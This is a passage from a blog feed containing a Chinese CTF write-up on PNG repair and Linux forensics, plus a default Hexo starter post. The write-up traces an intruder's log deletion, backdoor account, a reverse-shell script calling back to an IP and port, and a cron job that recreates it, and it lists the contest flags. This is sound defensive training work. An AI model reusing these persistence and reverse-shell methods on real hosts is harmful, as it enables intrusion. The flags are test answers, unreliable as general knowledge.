src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101163449237.png" alt="image-20251101163449237"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cdusec</span><span class="hljs-template-variable">&#123;abc_def_ghi&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="修图大师"><a href="#修图大师" class="headerlink" title="修图大师"></a>修图大师</h2><p>附件是一个已经损坏的图片</p><p>用010打开发现，<strong>文件头被反着写了</strong></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101165142736.png" alt="image-20251101165142736"></p><p>应该是</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">89 </span><span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span> <span class="hljs-number">0</span>D <span class="hljs-number">0</span>A <span class="hljs-number">1</span>A <span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p><strong>文件尾也同样被调换了位置</strong></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101164954489.png" alt="image-20251101164954489"></p><p>应该是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">49</span> <span class="hljs-number">45</span> <span class="hljs-number">4</span>E <span class="hljs-number">44</span> AE <span class="hljs-number">42</span> <span class="hljs-number">60</span> <span class="hljs-number">82</span><br></code></pre></td></tr></table></figure><p>修改完成后图片可以正常打开了</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101165236996.png" alt="image-20251101165236996"></p><p>可以从010中知道是豆包生成的：</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101165405145.png" alt="image-20251101165405145"></p><p>但是图片里面没水印，也没发现其他内容，那说明很可能是<strong>宽高被修改</strong>了</p><p>使用工具一键修复</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101165518602.png" alt="image-20251101165518602"></p><p>得到flag</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101165538018.png" alt="image-20251101165538018"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cdusec</span><span class="hljs-template-variable">&#123;dsnaj_dwjao_ojoic&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="取证大师-1"><a href="#取证大师-1" class="headerlink" title="取证大师-1"></a>取证大师-1</h2><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102192646565.png" alt="image-20251102192646565"></p><p>登陆进去后，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span> | less<br></code></pre></td></tr></table></figure><p>观察到黑客进入后使用的命令，其中包含了他登录进来后删除了日志文件的命令</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102192813349.png" alt="image-20251102192813349"></p><p>但是我们发现了日志的备份文件</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102192853379.png" alt="image-20251102192853379"></p><p>压缩文件使用zcat读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zcat /var/log/auth.log.2.gz | less<br></code></pre></td></tr></table></figure><p>但是一个个数不现实，使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zcat /var/log/auth.log.2.gz | grep -E <span class="hljs-string">&quot;Failed password for admin1|Invalid user admin1&quot;</span> | grep <span class="hljs-string">&quot;192.168.2.131&quot;</span> | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102193728590.png" alt="image-20251102193728590"></p><p>得到27次</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cdusec</span>&#123;<span class="hljs-number">192.168.2.131</span>_27&#125;<br></code></pre></td></tr></table></figure><h2 id="取证大师-2"><a href="#取证大师-2" class="headerlink" title="取证大师-2"></a>取证大师-2</h2><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102182823763.png" alt="image-20251102182823763"></p><p>创建了一个后门用户，那我们直接查看**&#x2F;etc&#x2F;passwd**</p><p>发现cxyzcb这个账户的UID跟admin1的很接近</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102182811977.png" alt="image-20251102182811977"></p><p>尝试提交，确定为后门用户</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cdusec</span><span class="hljs-template-variable">&#123;cxyzcb&#125;</span><br></code></pre></td></tr></table></figure><p>同样，可以使用<strong>history查看历史命令</strong>，也可以发现添加了一个cxyzcb用户</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102183251133.png" alt="image-20251102183251133"></p><hr><h2 id="取证大师-3"><a href="#取证大师-3" class="headerlink" title="取证大师-3"></a>取证大师-3</h2><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102183514581.png" alt="image-20251102183514581"></p><p>这里我的办法是查看历史命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span> | less<br></code></pre></td></tr></table></figure><p>发现</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102183643708.png" alt="image-20251102183643708"></p><p>其中的ip和端口即是flag</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cdusec&#123;<span class="hljs-number">39.105.63</span>.<span class="hljs-number">129_2333</span>&#125;<br></code></pre></td></tr></table></figure><p>或者我们可以去找到big.sh</p><p>可以通过历史命令找到文件位置</p><p>然后打开，也能发现ip和端口</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102191243471.png" alt="image-20251102191243471"></p><hr><h2 id="取证大师-4"><a href="#取证大师-4" class="headerlink" title="取证大师-4"></a>取证大师-4</h2><p>flag就是上面的big.sh</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cdusec</span><span class="hljs-template-variable">&#123;big.sh&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="取证大师-5"><a href="#取证大师-5" class="headerlink" title="取证大师-5"></a>取证大师-5</h2><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102200725866.png" alt="image-20251102200725866"></p><p>我们发现黑客一直在对xxxxx.sh做操作</p><table><thead><tr><th>行号</th><th>命令</th><th>作用分析</th></tr></thead><tbody><tr><td>96</td><td><code>cat big.sh</code></td><td>查看反弹shell脚本内容（确认其存在）</td></tr><tr><td><strong>100</strong></td><td><code>rm -rf big.sh</code></td><td><strong>删除反弹shell脚本</strong> → 触发后续重建机制</td></tr><tr><td><strong>102&#x2F;105&#x2F;129</strong></td><td><code>crontab -e</code></td><td><strong>编辑定时任务</strong> → 证明存在cron持久化机制</td></tr><tr><td><strong>106</strong></td><td><code>chmod+x/tmp/vmware-root_231499/xxxxx.sh</code></td><td><strong>赋予执行权限</strong> → <code>xxxxx.sh</code>是核心脚本</td></tr><tr><td><strong>115</strong></td><td><code>vim xxxxx.sh</code></td><td><strong>编辑脚本内容</strong> → 确认其控制<code>big.sh</code>生成逻辑</td></tr><tr><td><strong>117</strong></td><td><code>vim big.sh</code></td><td>重新生成<code>big.sh</code> → 证明<code>xxxxx.sh</code>能重建目标文件</td></tr></tbody></table><p>查找文件位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;xxxxx.sh&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102201225719.png" alt="image-20251102201225719"></p><p>查看发现，目标文件就是big.sh</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251102201336177.png" alt="image-20251102201336177"></p><p>会一直检测big.sh是否存在，被删除后再次重建并赋予执行权限，并且五秒检查一次</p><p>确认就是该文件</p><p>得到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cdusec</span><span class="hljs-template-variable">&#123;xxxxx.sh&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>赛题wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2026/02/26/hello-world/"/>
    <url>/2026/02/26/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
